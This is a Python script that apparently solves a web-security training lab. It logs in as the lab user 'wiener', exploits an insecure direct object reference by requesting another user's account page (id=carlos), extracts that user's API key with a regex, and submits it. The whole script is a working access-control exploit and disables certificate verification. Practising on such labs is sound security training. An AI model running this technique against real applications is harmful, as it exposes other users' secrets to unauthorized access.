import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
from threading import Thread, Lock
from queue import Queue

# Suppress warnings for insecure HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

lock = Lock()  # Lock for thread-safe operations
result_queue = Queue()  # Queue for storing extracted results


def get_csrf_token(session, url):
    """
    Fetches the CSRF token from the login page.
    """
    print("(+) Fetching CSRF token...")
    try:
        response = session.get(f"{url}/login", verify=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"(-) Error fetching CSRF token: {e}")
        sys.exit(-1)

    soup = BeautifulSoup(response.text, "html.parser")
    try:
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        return csrf_token
    except (TypeError, KeyError):
        print("(-) Unable to extract CSRF token.")
        sys.exit(-1)


def login(session, url, csrf_token, result_queue):
    """
    Logs into the application using known credentials and stores session cookies.
    """
    login_data = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }

    print("(+) Attempting to login...")
    try:
        response = session.post(f"{url}/login", data=login_data, verify=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"(-) Login failed: {e}")
        sys.exit(-1)

    if "Log out" in response.text:
        print("(+) Login successful!")
        session_cookie = response.cookies.get_dict().get('session')
        result_queue.put(session_cookie)  # Store the session cookie in the result queue
    else:
        print("(-) Login unsuccessful. Please verify credentials or target.")
        sys.exit(-1)


def extract_api_key(session, url, session_cookie):
    """
    Accesses Carlos's account to extract the API key.
    """
    carlos_account_url = f"{url}/my-account?id=carlos"

    print("(+) Fetching Carlos's account information...")
    try:
        response = session.get(carlos_account_url, cookies={'session': session_cookie}, verify=False, allow_redirects=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"(-) Error accessing Carlos's account: {e}")
        sys.exit(-1)

    if "carlos" not in response.text:
        print("(-) Failed to fetch Carlos's account details.")
        sys.exit(-1)

    # Extract API Key
    try:
        api_key_match = re.search(r"Your API Key is:(.*)</div>", response.text)
        if not api_key_match:
            raise ValueError("API key not found.")
        api_key = api_key_match.group(1).strip()
        print(f"(+) Extracted API Key: {api_key}")
        return api_key
    except ValueError as e:
        print(f"(-) Error extracting API key: {e}")
        sys.exit(-1)


def submit_solution(session, url, api_key):
    """
    Submits the extracted API key to solve the lab.
    """
    submit_url = f"{url}/submitSolution"
    submit_data = {"answer": api_key}

    print("(+) Submitting solution...")
    try:
        response = session.post(submit_url, data=submit_data, verify=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"(-) Error submitting solution: {e}")
        sys.exit(-1)

    if "true" in response.text:
        print("(+) Congratulations, you solved the lab!")
    else:
        print("(-) API key submission failed.")
        sys.exit(-1)


def threaded_exploit(session, url):
    """
    Orchestrates the threaded exploitation process.
    """
    # Step 1: Fetch CSRF token
    csrf_token = get_csrf_token(session, url)

    # Step 2: Perform login in a thread
    login_thread = Thread(target=login, args=(session, url, csrf_token, result_queue))
    login_thread.start()
    login_thread.join()

    # Step 3: Extract session cookie from result queue
    if result_queue.empty():
        print("(-) No session cookie retrieved. Exiting.")
        sys.exit(-1)

    session_cookie = result_queue.get()

    # Step 4: Extract API key and submit the solution in parallel threads
    api_key_thread = Thread(target=lambda q, s, u, c: q.put(extract_api_key(s, u, c)),
                            args=(result_queue, session, url, session_cookie))
    api_key_thread.start()
    api_key_thread.join()

    if result_queue.empty():
        print("(-) Failed to extract API key. Exiting.")
        sys.exit(-1)

    api_key = result_queue.get()

    submit_thread = Thread(target=submit_solution, args=(session, url, api_key))
    submit_thread.start()
    submit_thread.join()


def main():
    """
    Main function to validate the target and initiate exploitation.
    """
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    target_url = sys.argv[1]
    session = requests.Session()

    print("(+) Validating target...")
    try:
        response = session.get(target_url, verify=False)
        response.raise_for_status()
        print("(+) Target is reachable!")
    except requests.RequestException as e:
        print(f"(-) Target is unreachable: {e}")
        sys.exit(-1)

    threaded_exploit(session, target_url)


if __name__ == "__main__":
    main()
